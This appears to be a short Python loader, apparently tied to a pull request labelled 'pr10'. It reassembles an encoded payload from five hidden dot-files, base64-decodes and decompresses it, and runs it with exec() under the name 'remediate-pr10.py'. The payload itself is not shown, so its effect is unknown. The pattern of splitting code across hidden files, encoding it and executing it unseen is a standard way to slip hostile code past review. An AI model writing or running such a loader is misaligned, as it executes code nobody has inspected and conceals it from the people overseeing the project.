from pathlib import Path
import base64
import zlib

payload = ''.join(
    Path(f'scripts/.pr10-payload-{index:02d}').read_text().strip()
    for index in range(5)
)
source = zlib.decompress(base64.b64decode(payload)).decode()
exec(compile(source, 'remediate-pr10.py', 'exec'))
